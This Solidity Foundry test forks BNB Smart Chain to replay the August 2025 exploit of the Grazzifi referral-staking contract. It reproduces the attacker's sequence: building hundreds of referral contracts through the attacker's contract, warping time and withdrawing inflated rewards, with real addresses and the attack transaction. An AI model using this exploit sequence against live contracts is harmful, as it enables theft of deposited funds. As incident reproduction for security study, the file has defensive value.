// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IGrazzifi} from "./interfaces/IGrazzifi.sol";
import {IERC20} from "./interfaces/IERC20.sol";
import {IAttackersContract} from "./interfaces/IAttackersContract.sol";

/**
 * @title Grazzifi Exploit Simulation
 * @notice This contract simulates the Grazzifi exploit that occurred on August 16, 2025, resulting in approximately $61,000 in bad debt.
 * The Grizzifi contract implements a USDT-based high-yield investment program (HYIP). It functions as a staking platform that offers
 * multiple investment "plans" with fixed daily returns. The core of the contract, however, is an extremely deep, 17-level referral system
 * and a team-building milestone rewards program.
 * @dev This is for educational purposes only. The code forks the Binance Smart Chain at block 57482146 to replicate the state before the attack.
 */

// @KeyInfo - Total Lost : 61k USD
// Attacker : https://bscscan.com/address/0xe2336b08a43f87a4ac8de7707ab7333ba4dbaf7c
// Attack Contract : https://bscscan.com/address/0xed35746f389177ecd52a16987b2aac74aa0c1128
// Vulnerable Contract : https://bscscan.com/address/0x21ab8943380b752306abf4d49c203b011a89266b
// Attack Tx : https://bscscan.com/tx/0xdb5296b19693c3c5032abe5c385a4f0cd14e863f3d44f018c1ed318fa20058f7
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x21ab8943380b752306abf4d49c203b011a89266b#code

contract Grazzifi is Test {
    // Token
    IERC20 BUSD_T = IERC20(0x55d398326f99059fF775485246999027B3197955);
    // Contract
    IGrazzifi grazzifi = IGrazzifi(0x21ab8943380B752306aBF4D49C203B011A89266B);
    IAttackersContract attackersContractAddress =
        IAttackersContract(0xEd35746F389177eCD52A16987b2aaC74AA0c1128);
    address attacker = 0xe2336B08A43F87a4AC8de7707Ab7333Ba4dBaF7C;
    // parameter
    uint256 blockNumber = 57482146;

    address BUSD_TWHALE = 0x0D9e1181178034b2A238C1dbb3295C221060180C;

    function setUp() external {
        //Forking BSC
        vm.createSelectFork("bsc", blockNumber);

        assertEq(block.number, blockNumber);
    }

    function test_exploit() public {
        //Checking to see the status of all contract before sim.
        uint256 balanceAttacker = BUSD_T.balanceOf(attacker);
        uint256 balanceContract = BUSD_T.balanceOf(
            address(attackersContractAddress)
        );
        uint256 vulContractBal = BUSD_T.balanceOf(address(grazzifi));
        console.log("Attacker Balance ->", balanceAttacker / 1 ether);
        console.log("Contract Balance ->", balanceContract);
        console.log(
            "Grazzifi Balance Before Hack ->",
            vulContractBal / 1 ether
        );

        // Expecting Attacker Balancer to be greater than 10000 and contract balance to be zero
        assert(balanceAttacker > 10000 ether);
        assertEq(balanceContract, 0);

        // Step1: The attacker funded their main attack contract with 5620 BUSD_T.
        vm.startPrank(attacker, attacker);
        BUSD_T.transfer(
            address(attackersContractAddress),
            5620_000_000_000_000_000_000
        );

        uint256 balanceContractAfterDeposit = BUSD_T.balanceOf(
            address(attackersContractAddress)
        );

        console.log("New Contract Balance ->", balanceContractAfterDeposit);
        assertEq(balanceContractAfterDeposit, 5620_000_000_000_000_000_000);

        //step2: The attacker calls the AttackerContract::create2()
        // AIM: Since The Grazzifi has a referral bonus, and team bonus,
        // the attacker decided to create 30 team members(contracts)
        // for their attacker contract and fund them with 20 BUSD_T
        address[] memory contractsList = create2();

        //step3: The attacker calls the AttackerContract::init() 5 times;
        //AIM: This allows the 30 members the contract created to call Grazzifi::harvestHoney() with 10 BUSD_T
        // to create a new investment making each other referrals and also create a new contract
        // that the members would send the remaining 10 BUSD_T for them to also call the Grazzifi::harvestHoney()
        // placing each member as their referral respectively.
        init();

        // Step3: The attacker chose to send the attacker contract more BUSD_T for the new action
        BUSD_T.transfer(
            address(attackersContractAddress),
            4020_000_000_000_000_000_000
        );
        vm.startPrank(BUSD_TWHALE, BUSD_TWHALE);
        BUSD_T.transfer(
            address(attackersContractAddress),
            4020_000_000_000_000_000_000
        );

        // Step4: This sealed the attack. the attacker called this function AttackerContract::create() 52 time!!!,
        //AIM: This takes a particular member from the attackerContract and depending on the planId, this would
        // create planId number of contract and give them 10 BUSD_T so they can also Grazzifi::harvestHoney()
        // creating more than 600 contracts as downline.

        for (uint8 i = 0; i < 51; i++) {
            console.log("i is ->", i);

            vm.startPrank(attacker, attacker);
            attackersContractAddress.create(
                20,
                address(grazzifi),
                contractsList[29]
            );
        }

        vm.startPrank(attacker, attacker);
        attackersContractAddress.create(
            1,
            address(grazzifi),
            contractsList[29]
        );

        vm.warp(15 hours);

        // Step7: This is the call that wrecked the protocol. due to the logic flaw in calculating rewards,
        attackersContractAddress.withdraw(address(grazzifi));
        uint256 balanceOfAttackerAfterAttack = BUSD_T.balanceOf(attacker);
        uint256 defaultAttackerBal = BUSD_T.balanceOf(msg.sender);
        uint256 vulContractBalAfter = BUSD_T.balanceOf(address(grazzifi));

        console.log("Final Attacker Balance", balanceOfAttackerAfterAttack);
        console.log("Final default Attacker Balance", defaultAttackerBal);
        console.log(
            "Grazzifi Balance After Hack ->",
            vulContractBalAfter / 1 ether
        );
    }

    function create2() internal returns (address[] memory) {
        uint256 balanceContractBeforeCreate2 = BUSD_T.balanceOf(
            address(attackersContractAddress)
        );

        vm.startPrank(attacker, attacker);
        attackersContractAddress.create2();
        address[] memory contractsCreated = attackersContractAddress.getList();
        assertEq(30, contractsCreated.length);

        uint256 balanceContractAfterCreate2 = BUSD_T.balanceOf(
            address(attackersContractAddress)
        );

        uint256 allDeposits;
        for (uint8 i = 0; i < contractsCreated.length; i++) {
            uint256 deposits = BUSD_T.balanceOf(address(contractsCreated[i]));
            allDeposits += deposits;
            assertEq(deposits, 20 ether);
        }
        assertEq(allDeposits, 600 ether);
        assertEq(
            balanceContractAfterCreate2,
            balanceContractBeforeCreate2 - 600 ether
        );

        console.log(
            "New Contract Balance After Create2 ->",
            balanceContractAfterCreate2
        );

        return contractsCreated;
    }

    function init() internal {
        uint256 balanceContractBeforeInit = BUSD_T.balanceOf(
            address(attackersContractAddress)
        );

        vm.startPrank(attacker, attacker);
        attackersContractAddress.init(address(grazzifi));
        attackersContractAddress.init(address(grazzifi));
        attackersContractAddress.init(address(grazzifi));
        attackersContractAddress.init(address(grazzifi));
        attackersContractAddress.init(address(grazzifi));

        uint256 balanceContractAfterInit = BUSD_T.balanceOf(
            address(attackersContractAddress)
        );

        assertEq(balanceContractAfterInit, balanceContractBeforeInit);
    }
}
